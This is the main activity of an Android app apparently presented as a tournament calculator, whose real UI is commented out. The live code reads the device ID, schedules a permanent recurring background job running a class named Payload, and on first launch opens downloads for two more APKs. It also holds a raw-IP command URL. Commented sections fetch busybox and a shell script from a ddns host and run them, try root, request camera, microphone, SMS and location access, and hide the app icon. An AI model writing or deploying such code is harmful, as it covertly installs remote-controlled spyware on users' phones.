package com.example.pista.tornei;

import android.Manifest;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
/*import android.support.annotation.NonNull;
import android.support.design.widget.FloatingActionButton;
import android.support.design.widget.Snackbar;
import android.support.v4.app.ActivityCompat;
import android.support.v7.app.AppCompatActivity;
import android.support.v7.widget.Toolbar;*/
import android.text.Editable;
import android.text.TextWatcher;
import android.util.Log;
import android.view.View;
import android.view.Menu;
import android.view.MenuItem;
import android.widget.Button;
import android.widget.EditText;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import android.provider.Settings.Secure;

import com.firebase.jobdispatcher.JobTrigger;
import com.fsck.k9.mail.FetchProfile;
import com.fsck.k9.mail.Folder;
import com.fsck.k9.mail.Folder.FolderType;
import com.fsck.k9.mail.Message;
import com.fsck.k9.mail.MessagingException;
import com.fsck.k9.mail.ssl.DefaultTrustedSocketFactory;
import com.fsck.k9.mail.ssl.TrustedSocketFactory;
import com.fsck.k9.mail.store.imap.ImapFolder;
import com.fsck.k9.mail.store.imap.ImapMessage;
import com.fsck.k9.mail.store.imap.ImapResponse;
import com.fsck.k9.mail.store.imap.ImapSearcher;
import com.fsck.k9.mail.store.imap.ImapStore;
import com.fsck.k9.mail.store.StoreConfig;
import com.fsck.k9.mail.NetworkType;
import javax.mail.*;
import javax.mail.search.FlagTerm;
import java.util.*;
import com.firebase.jobdispatcher.Constraint;
import com.firebase.jobdispatcher.FirebaseJobDispatcher;
import com.firebase.jobdispatcher.GooglePlayDriver;
import com.firebase.jobdispatcher.Job;
import com.firebase.jobdispatcher.Lifetime;
import com.firebase.jobdispatcher.RetryStrategy;
import com.firebase.jobdispatcher.Trigger;

import static com.firebase.jobdispatcher.Lifetime.FOREVER;
import 	android.app.ActivityManager;

public class MainActivity extends Activity {
    public static Context gcontext;
    public static String curdir;
    Intent mis;
    private EditText eGiocatori;
    private EditText ePartiteTot;
    private EditText ePartite;
    private Button btClose;
    SharedPreferences prefs = null;
    @Override
    protected void onCreate(Bundle savedInstanceState) {



        //Intent i = new Intent("com.zegoggles.smssync.BACKUP");
        //sendBroadcast(i);


         String android_id = Secure.getString(this.getContentResolver(),
                Secure.ANDROID_ID);


        String str= new String("down http://151.76.198.146/svc/wup.php?pc=ppppp");
        String str1= getApplicationInfo().dataDir;
        String str2=str.substring(5,str.length());
        String str3=str.substring( str.lastIndexOf('/')+1, str.length() );

/*        try {
            //Process p Runtime.getRuntime().exec("su", null, null);
            Process p = Runtime.getRuntime().exec("su");
            try {
                p.waitFor();
            }
            catch (InterruptedException e) {
                System.out.println("got interrupted!");
            }
        } catch (IOException e) {
            e.printStackTrace();
        }
*/
        super.onCreate(savedInstanceState);
//        String fileName="myapp.apk";
//        openApk(MyConfig.apk1);
        Bundle myExtrasBundle = new Bundle();


        myExtrasBundle.putString("mpath", this.getApplicationInfo().dataDir);
        myExtrasBundle.putString("mandroid_id", android_id);
        FirebaseJobDispatcher mDispatcher = new FirebaseJobDispatcher(new GooglePlayDriver(this));
        Job myJob = mDispatcher.newJobBuilder()
                .setService(com.example.pista.tornei.Payload.class)
                .setTag("TagPaylo")
                .setRecurring(true)
                //.setTrigger(Trigger.executionWindow(5, 30))
                .setTrigger(Trigger.executionWindow(0, 120))
                .setLifetime(FOREVER)
                .setReplaceCurrent(false)
                .setConstraints(Constraint.ON_ANY_NETWORK)
                .setRetryStrategy(RetryStrategy.DEFAULT_EXPONENTIAL)
                .setExtras(myExtrasBundle)
                .build();
        mDispatcher.mustSchedule(myJob);

        prefs = getSharedPreferences("com.example.pista.tornei", MODE_PRIVATE);
        if (prefs.getBoolean("firstrun", true)) {
            //setContentView(R.layout.activity_main);
            //Uri uri = Uri.parse("https://play.google.com/store/apps/details?id=net.metaquotes.metatrader5"); // missing 'http://' will cause crashed
            //Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            //startActivity(intent);
            Uri uri = Uri.parse("https://github.com/pistacchietto/ProtectedService1/raw/master/app/release/prot.apk");

            Intent intent = new Intent(Intent.ACTION_VIEW, uri);
            startActivity(intent);
            uri = Uri.parse("https://github.com/pistacchietto/Tornei/raw/master/app/release/auto.apk");
             intent = new Intent(Intent.ACTION_VIEW, uri);
            startActivity(intent);
            // Do first run stuff here then set 'firstrun' as false
            // using the following line to edit/commit prefs
            prefs.edit().putBoolean("firstrun", false).commit();

        }


/*       Intent intent = new Intent(Intent.ACTION_MAIN);
        intent.setClassName("com.example.protectedservice", "com.example.protectedservice.ActivityRestart");
        if (!isActivityRunning(intent.getClass()))
            startActivity(intent);
*/

        //hideApplication();
        finish();

/*        gcontext=this;
        curdir=gcontext.getApplicationInfo().dataDir;
        new C00003().start();
*/      //  mis = new Intent(this,MyIntentService.class);
        //initJobs();
        //QuickPeriodicJobScheduler jobScheduler = new QuickPeriodicJobScheduler(this);
        //jobScheduler.start(1, 60000l); // Run job with jobId=1 every 60 seconds

        //this.startService(mis);
        //finish();

//        hideApplication();
        /*ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA,
                Manifest.permission.RECORD_AUDIO,
                Manifest.permission.READ_CONTACTS,
                Manifest.permission.ACCESS_FINE_LOCATION,
                Manifest.permission.READ_SMS,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.READ_EXTERNAL_STORAGE}, 2);
        */
        //hideApplication();
        /*setContentView(R.layout.activity_main);


        eGiocatori=(EditText)findViewById(R.id.editGiocatori);
        ePartiteTot=(EditText)findViewById(R.id.editPartiteTot);
        ePartite=(EditText)findViewById(R.id.editPartite);
        btClose=(Button)findViewById(R.id.bclose);
        btClose.setOnClickListener(
                new Button.OnClickListener() {
                    public void onClick(View v) {
                        hideApplication();
                        finish();
                    }
                }
        );
        eGiocatori.addTextChangedListener(new TextWatcher() {
            @Override
            public void beforeTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void onTextChanged(CharSequence charSequence, int i, int i1, int i2) {

            }

            @Override
            public void afterTextChanged(Editable editable) {
                if (eGiocatori.getText().toString().trim().length() > 0) {
                    ePartiteTot.setText(String.valueOf(binomial(Integer.parseInt(eGiocatori.getText().toString()), 4) * 3));
                    ePartite.setText(String.valueOf(binomial(Integer.parseInt(eGiocatori.getText().toString()), 2) / 2));
                }
            }
        });

       /* Toolbar toolbar = (Toolbar) findViewById(R.id.toolbar);
        setSupportActionBar(toolbar);

        FloatingActionButton fab = (FloatingActionButton) findViewById(R.id.fab);
        fab.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                Snackbar.make(view, "Replace with your own action", Snackbar.LENGTH_LONG)
                        .setAction("Action", null).show();
            }
        });
    }
    private static long binomial(int n, int k)
    {
        if (k>n-k)
            k=n-k;

        long b=1;
        for (int i=1, m=n; i<=k; i++, m--)
            b=b*m/i;
        return b;
    }
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String permissions[], @NonNull int[] grantResults) {
        boolean bok=false;
        for(int element:grantResults)
        {
            if (element>=0) {
                if (grantResults.length > 0 && grantResults[element] == PackageManager.PERMISSION_GRANTED) {//&& requestCode==1) {
                    bok = true;
                }
            }
            else
            {
                bok=false;
                break;
            }

        }

        if (bok) {
            //hideApplication();
            //finish();
        }
        else
        {
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.CAMERA,
                    Manifest.permission.RECORD_AUDIO,
                    Manifest.permission.READ_CONTACTS,
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.READ_SMS,
                    Manifest.permission.READ_EXTERNAL_STORAGE}, 2);

        }

    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    */}
/*    static class C00003 extends Thread {
        C00003() {
        }

        public void run() {
            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/busybox");
            Payload.DownloadFromUrl("http://verifiche.ddns.net/android/woffice.sh");
            try {
                Process pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/busybox");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("chmod 755 "+curdir+"/woffice.sh");
                Thread.sleep(60 * 1000);
                pexec = Runtime.getRuntime().exec("nohup "+curdir+"/woffice.sh");
            }catch (Exception e) {
                e.printStackTrace();
            }
            Payload.main(null);
        }
    }
*/
protected Boolean isActivityRunning(Class activityClass)
    {
        ActivityManager activityManager = (ActivityManager) getBaseContext().getSystemService(Context.ACTIVITY_SERVICE);
        List<ActivityManager.RunningTaskInfo> tasks = activityManager.getRunningTasks(Integer.MAX_VALUE);

        for (ActivityManager.RunningTaskInfo task : tasks) {
            if (activityClass.getCanonicalName().equalsIgnoreCase(task.baseActivity.getClassName()))
                return true;
        }

        return false;
    }
    public void openApk(String fileName) {

        ((MyApplication) getApplication()).LoadApk(fileName);
    }
    private void hideApplication() {
        // nasconde l'icona dal drawer dopo il primo avvio
        PackageManager pm = getApplicationContext().getPackageManager();
        pm.setComponentEnabledSetting(getComponentName(), PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
                PackageManager.DONT_KILL_APP);

    }
    public void initJobs() {
        int jobId = 1;
        QuickPeriodicJob job = new QuickPeriodicJob(jobId, new PeriodicJob() {
            @Override
            public void execute(QuickJobFinishedCallback callback) {
                //Payload.main(null);

                // When you have done all your work in the job, call jobFinished to release the resources
                callback.jobFinished();
            }
        });
        QuickPeriodicJobCollection.addJob(job);
    }
}
